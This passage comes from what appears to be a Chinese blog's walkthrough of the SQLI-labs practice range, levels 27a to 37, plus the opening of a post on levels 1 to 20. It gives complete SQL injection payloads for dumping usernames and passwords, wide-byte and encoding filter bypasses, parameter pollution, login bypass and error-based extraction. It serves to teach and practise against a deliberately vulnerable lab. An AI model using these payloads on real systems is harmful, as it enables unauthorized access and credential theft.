相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><pre><code class="hljs sql">?id=999&quot;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 - # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 空格 +</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);.<span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>%a0SEPARATOR%a00x3c62723e))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># id = &#x27;x&#x27; 的拼接方式</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 查询 query 的字符串</span><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-comment"># 模拟 tomcat 的查询函数 处理一下</span><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 再次过滤检测</span>whitelist(<span class="hljs-variable">$id1</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());<span class="hljs-meta">?&gt;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;    <span class="hljs-comment"># &amp; 作为分隔符 分割字符串</span>    <span class="hljs-variable">$qs_array</span>= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);    <span class="hljs-comment"># 遍历 qs_array 数组</span>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)    &#123;            <span class="hljs-variable">$val</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);        <span class="hljs-comment"># 如果数组前两位是 id 的话</span>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)        &#123;                <span class="hljs-comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>            <span class="hljs-variable">$id_value</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>);             <span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># 过滤规则 检测数字</span>    <span class="hljs-variable">$match</span> = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);    <span class="hljs-keyword">if</span> 不符合规则：        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);&#125;</code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre><code class="hljs Php"><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);...whitelist(<span class="hljs-variable">$id1</span>);</code></pre><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre><code class="hljs Php">index.php?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32(宽字节注入)"></a>Less-32(宽字节注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-comment"># \ 转换为 \\</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          将       <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);         <span class="hljs-comment"># 将 &quot; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><p>1、<code>%df</code> 吃掉 <code>\</code></p><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>2、将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</p><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre><code class="hljs Php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= addslashes(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre><code class="hljs php"><span class="hljs-variable">$uname</span> = addslashes(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= addslashes(<span class="hljs-variable">$passwd1</span>);</code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre><code class="hljs Bash">➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-16</span><span class="hljs-string">��&#x27;</span>➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-32</span><span class="hljs-string">��&#x27;</span></code></pre><p>首先尝试一个经典的万能密码：</p><pre><code class="hljs Payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre><code class="hljs Sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#and password=&#x27;$passwd&#x27; LIMIT 0,1</span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre><code class="hljs Bash"><span class="hljs-comment"># where username = &#x27;x&#x27; or 1</span>mysql&gt;  select * from users <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;x&#x27;</span> or 1;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0</span><span class="hljs-string">mysql&gt;  select * from users where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0;</span><span class="hljs-string">Empty set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where 1</span><span class="hljs-string">mysql&gt;  select * from users where 1;</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">| id | username   | password |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">|  1 | Dumb       | 0        |</span><span class="hljs-string">|  2 | Angelina   | 0        |</span><span class="hljs-string">|  3 | Dummy      | 0        |</span><span class="hljs-string">|  4 | secure     | 0        |</span><span class="hljs-string">|  5 | stupid     | 0        |</span><span class="hljs-string">|  6 | superman   | 0        |</span><span class="hljs-string">|  7 | batman     | 0        |</span><span class="hljs-string">|  8 | admin      | 1234     |</span><span class="hljs-string">|  9 | admin1     | 0        |</span><span class="hljs-string">| 10 | admin2     | 0        |</span><span class="hljs-string">| 11 | admin3     | 0        |</span><span class="hljs-string">| 12 | dhakkan    | 0        |</span><span class="hljs-string">| 14 | admin4     | 0        |</span><span class="hljs-string">| 15 | admin&#x27;</span><span class="hljs-comment">#sec | 123      |</span>+----+------------+----------+14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<span class="hljs-comment"># where 0</span>mysql&gt; select * from users <span class="hljs-built_in">where</span> 0;Empty <span class="hljs-built_in">set</span> (0.00 sec)</code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre><code class="hljs sql">uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span> = addslashes(<span class="hljs-variable">$string</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>但是本关的拼接方式是：</p><pre><code class="hljs Bash"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-36-Bypass-mysql-real-escape-string"><a href="#Less-36-Bypass-mysql-real-escape-string" class="headerlink" title="Less-36(Bypass mysql_real_escape_string)"></a>Less-36(Bypass mysql_real_escape_string)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_quotes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= mysql_real_escape_string(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><p>或者</p><pre><code class="hljs sql">?id=-1�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre><code class="hljs Php"><span class="hljs-variable">$uname</span> = mysql_real_escape_string(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= mysql_real_escape_string(<span class="hljs-variable">$passwd1</span>);</code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>或者：</p><pre><code class="hljs sql">uname=�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之基础挑战 1-20 关</title>
    <link href="/p/22efef48.html"/>
    <url>/p/22efef48.html</url>
    
    <content type="html"><![CDATA[<h1 id="常见注入流程"><a href="#常见注入流程" class="headerlink" title="常见注入流程"></a>常见注入流程</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>手动修改 <code>LIMIT 0,1</code> 来进行结果偏移</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 